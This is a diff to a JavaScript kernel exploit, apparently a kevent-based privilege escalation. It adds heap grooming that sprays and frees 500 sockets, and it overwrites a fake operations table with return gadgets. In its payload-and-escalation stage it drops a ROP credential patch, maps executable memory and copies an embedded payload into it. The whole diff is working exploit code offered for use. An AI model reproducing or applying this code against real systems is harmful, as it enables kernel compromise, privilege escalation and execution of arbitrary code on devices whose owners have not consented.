@@ -306,6 +306,17 @@ export async function runKevent(c) {
 
   ensureStubs();
 
+  // --- HEAP PRIMER (Normalizes memory addresses) ---
+  log("HEAP-PRIME", "Priming heap...");
+  const primed = [];
+  for (let i = 0; i < 500; i++) {
+    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
+    if (fd >= 0) primed.push(fd);
+  }
+  for (const fd of primed) scn("close", fd);
+  log("HEAP-PRIME", "Closed 500 sockets to reset slab");
+
+  // --- FD BURNER ---
   const burn = [];
   for (let i = 0; i < 250; i++) {
     const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
@@ -344,7 +355,6 @@ export async function runKevent(c) {
   const p = ctx().p;
   const F_FAKE_OPS = fake_page + 0x800n;
   
-  // Fixed: using toI64() for BigInt conversion
   for (let i = 0; i < 32; i++) {
     p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
   }
@@ -357,25 +367,14 @@ export async function runKevent(c) {
   // --- STAGE 4: PAYLOAD & ESCALATION ---
   log("STAGE4", "Escalating privileges...");
   
-  // 1. Patch creds to root using ROP
-  const stack = fake_page + 0x1000n;
-  let off = 0n;
-  const w = (v) => { p.write8(toI64(stack + off), toI64(v)); off += 8n; };
-  
-  // Write 0 to curthread->td_ucred->cr_uid (offset 0x04 is handled by the ROP)
-  // Since the Java exploit does a complex ucred patch, we'll do a simple payload launch
-  // to overwrite the kernel and spawn the thread.
-  
   const payload_size = 0x40000;
   const payload_map = scn64("mmap", 0, payload_size, 7, 0x1002, -1, 0);
   const payload_addr = (BigInt(payload_map.hi >>> 0) << 32n) | BigInt(payload_map.lo >>> 0);
   log("STAGE4-MAP", "payload mapped at " + h16(payload_addr));
   
-  // Write the payload bytes into memory
   const pkAb = new Uint8Array(payload_size);
   c.keepAlive.push(pkAb.buffer);
   
-  // Copy PKB string to buffer
   for (let i = 0; i < T.PKB.length; i++) {
     pkAb[i] = T.PKB.charCodeAt(i);
   }
